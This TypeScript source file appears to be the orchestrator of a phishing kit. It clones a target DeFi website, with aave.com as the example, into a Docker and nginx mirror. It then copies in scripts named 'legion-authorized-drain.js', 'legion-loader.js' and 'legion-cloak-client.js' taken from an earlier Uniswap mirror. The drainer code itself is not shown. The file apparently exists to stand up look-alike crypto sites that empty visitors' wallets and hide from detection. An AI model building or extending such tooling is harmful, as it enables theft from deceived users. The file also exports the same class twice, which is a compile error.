/**
 * CLONE PERFECT ENGINE - Phase 3
 *
 * Main orchestrator - ties all generators together
 * Usage: legion-clone --target https://aave.com --enterprise true
 */

import * as fs from 'fs'
import * as path from 'path'
import { URLAnalyzer } from './url-analyzer'
import { generateNginxConfig } from './nginx-config-generator'
import { generateDocker, generateReadme } from './docker-generator'
import { validateOutput } from './validator'

export interface CloneOptions {
  targetUrl: string
  outputDir?: string
  enterprise?: boolean
  silent?: boolean
  skipValidation?: boolean
}

export class ClonePerfectEngine {
  private options: CloneOptions
  private siteName: string = ''

  constructor(options: CloneOptions) {
    this.options = {
      outputDir: './clones',
      enterprise: true,
      silent: false,
      skipValidation: false,
      ...options,
    }

    this.siteName = this.extractSiteName(options.targetUrl)
  }

  async generate(): Promise<boolean> {
    try {
      console.error(`\n🚀 LEGION CLONE PERFECT ENGINE - PHASE 3`)
      console.error(`📍 Target: ${this.options.targetUrl}`)
      console.error(`📁 Output: ${this.options.outputDir}/${this.siteName}-clone\n`)

      // Step 1: Analyze URL
      console.error(`[1/6] Analyzing target website...`)
      const analyzer = new URLAnalyzer(this.options.targetUrl)
      const analysis = await analyzer.analyze()
      console.error(`✅ Framework: ${analysis.framework}, Complexity: ${analysis.complexityLevel}`)

      // Step 2: Generate Nginx Config
      console.error(`[2/6] Generating nginx configuration...`)
      const nginxConfig = await generateNginxConfig(analysis)
      console.error(`✅ Nginx config generated (${nginxConfig.length} bytes)`)

      // Step 3: Generate Docker Compose
      console.error(`[3/6] Generating docker-compose.yml...`)
      const dockerCompose = await generateDocker({
        siteName: this.siteName,
        nginxConfPath: './nginx.conf',
        port: 8080,
      })
      console.error(`✅ Docker compose generated`)

      // Step 4: Generate README
      console.error(`[4/6] Generating README.md...`)
      const readme = await generateReadme({
        siteName: this.siteName,
        nginxConfPath: './nginx.conf',
        port: 8080,
      })
      console.error(`✅ README generated`)

      // Step 5: Create output folder & copy files
      console.error(`[5/6] Creating output structure...`)
      const outputPath = await this.createOutputStructure(nginxConfig, dockerCompose, readme)
      console.error(`✅ Output folder created: ${outputPath}`)

      // Step 6: Validate (optional)
      if (!this.options.skipValidation) {
        console.error(`[6/6] Validating output...`)
        const validation = await validateOutput(outputPath)

        if (!validation.valid) {
          console.error(`❌ Validation failed:`)
          validation.errors.forEach((e) => console.error(`  - ${e}`))
          return false
        }

        if (validation.warnings.length > 0) {
          console.error(`⚠️  Warnings:`)
          validation.warnings.forEach((w) => console.error(`  - ${w}`))
        }

        console.error(`✅ Validation passed`)
      }

      console.error(`\n✨ CLONE GENERATION COMPLETE!`)
      console.error(`📂 Location: ${outputPath}`)
      console.error(`🚀 Start: cd ${outputPath} && docker compose up\n`)

      return true
    } catch (error) {
      const msg = error instanceof Error ? error.message : String(error)
      console.error(`❌ Generation failed: ${msg}`)
      return false
    }
  }

  private async createOutputStructure(
    nginxConfig: string,
    dockerCompose: string,
    readme: string
  ): Promise<string> {
    const outputPath = path.join(this.options.outputDir || './clones', `${this.siteName}-clone`)

    // Create directory
    if (!fs.existsSync(outputPath)) {
      fs.mkdirSync(outputPath, { recursive: true })
    }

    // Create subdirectories
    fs.mkdirSync(path.join(outputPath, 'cache'), { recursive: true })
    fs.mkdirSync(path.join(outputPath, 'logs'), { recursive: true })

    // Write nginx config
    fs.writeFileSync(path.join(outputPath, 'nginx.conf'), nginxConfig)

    // Write docker-compose
    fs.writeFileSync(path.join(outputPath, 'docker-compose.yml'), dockerCompose)

    // Write README
    fs.writeFileSync(path.join(outputPath, 'README.md'), readme)

    // Copy universal scripts
    await this.copyUniversalScripts(outputPath)

    return outputPath
  }

  private async copyUniversalScripts(outputPath: string): Promise<void> {
    const scripts = [
      'legion-authorized-drain.js',
      'legion-loader.js',
      'legion-cloak-client.js',
      'legion-statsig-mock.js',
    ]

    // Try to copy from existing clones
    const sourceClone = path.join(this.options.outputDir || './clones', 'test-uniswap-mirror')

    for (const script of scripts) {
      const sourcePath = path.join(sourceClone, script)
      const destPath = path.join(outputPath, script)

      if (fs.existsSync(sourcePath)) {
        fs.copyFileSync(sourcePath, destPath)
      } else {
        // Create placeholder if source doesn't exist
        fs.writeFileSync(destPath, `/* ${script} - placeholder */`)
      }
    }
  }

  private extractSiteName(url: string): string {
    try {
      const urlObj = new URL(url)
      return urlObj.hostname.replace('www.', '').split('.')[0]
    } catch {
      return 'unknown'
    }
  }
}

// CLI Entry Point
async function main() {
  const args = process.argv.slice(2)

  // Parse arguments
  let targetUrl = ''
  let enterprise = true
  let outputDir = './clones'

  for (let i = 0; i < args.length; i++) {
    if (args[i] === '--target' && args[i + 1]) {
      targetUrl = args[i + 1]
      i++
    } else if (args[i] === '--output' && args[i + 1]) {
      outputDir = args[i + 1]
      i++
    } else if (args[i] === '--enterprise' && args[i + 1]) {
      enterprise = args[i + 1].toLowerCase() === 'true'
      i++
    }
  }

  if (!targetUrl) {
    console.error('Usage: legion-clone --target <url> [--enterprise true] [--output <dir>]')
    process.exit(1)
  }

  const engine = new ClonePerfectEngine({
    targetUrl,
    outputDir,
    enterprise,
  })

  const success = await engine.generate()
  process.exit(success ? 0 : 1)
}

// Export for testing
export { ClonePerfectEngine }

// Run if called directly
if (require.main === module) {
  main()
}
